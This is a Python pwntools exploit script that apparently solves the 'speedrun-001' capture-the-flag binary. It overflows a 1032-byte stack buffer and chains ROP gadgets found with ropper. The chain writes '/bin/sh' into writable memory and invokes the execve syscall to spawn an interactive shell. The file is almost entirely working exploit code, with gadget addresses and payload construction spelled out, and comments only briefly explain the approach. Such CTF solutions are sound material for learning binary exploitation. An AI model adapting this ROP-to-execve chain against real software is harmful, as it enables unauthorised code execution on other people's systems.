import pwn
import struct

# speedrun-001 is a 64-bit statically linked executable
# NX is enabled. ASLR is turned on

# Because this is a fairly large statically linked executable, we have a wide selection of gadgets we can rop with
# We can write "/bin/sh" to memory, and then execute a syscall command with all the right parameters to pop a shell
# No libc needed

target = pwn.process('./speedrun-001')
target.recvuntil("words?")

# Buffer overflow is 1032 bytes

# pop rax gadget: ropper --file speedrun-001 --search "pop rax; ret;" 
# 0x0000000000415664
pop_rax = struct.pack("<Q", 0x0000000000415664)

# pop rdi gadget: ropper --file speedrun-001 --search "pop rdi; ret;"
# 0x0000000000400686
pop_rdi = struct.pack("<Q", 0x0000000000400686)

# pop rsi gadget: ropper --file speedrun-001 --search "pop rsi; ret;"
# 0x00000000004101f3
pop_rsi = struct.pack("<Q", 0x00000000004101f3)

# pop rdx gadget: ropper --file speedrun-001 --search "pop rdx; ret;"
# 0x000000000044be16
pop_rdx = struct.pack("<Q", 0x000000000044be16)

# syscall gadget: ropper --file speedrun-001 --search "syscall"
# 0x000000000040129c
syscall = struct.pack("<Q", 0x000000000040129c)

# Putting '/bin/sh' in memory
# Writeable Memory Address (vmmap): 0x000000006b6000

# Move to memory gadget: ropper --file speedrun-001 --search "mov [rax]"
# 0x000000000048d251: mov qword ptr [rax], rdx; ret;
writeable_memory_addr = struct.pack("<Q", 0x000000006b6000)
mov_to_mem = struct.pack("<Q", 0x000000000048d251)

#bin_sh = b"/bin/sh\x00" <-- This also works in this case btw --
bin_sh = struct.pack("<Q", 0x0068732f6e69622f)

payload = b'a' * 1032

payload += pop_rax
payload += writeable_memory_addr
payload += pop_rdx
payload += bin_sh
payload += mov_to_mem

payload += pop_rax
payload += struct.pack("<Q", 0x3b)

payload += pop_rdi
payload += writeable_memory_addr

payload += pop_rsi
payload += struct.pack("<Q", 0x0)

payload += pop_rdx
payload += struct.pack("<Q", 0x0)

payload += syscall 


target.sendline(payload)
target.interactive()
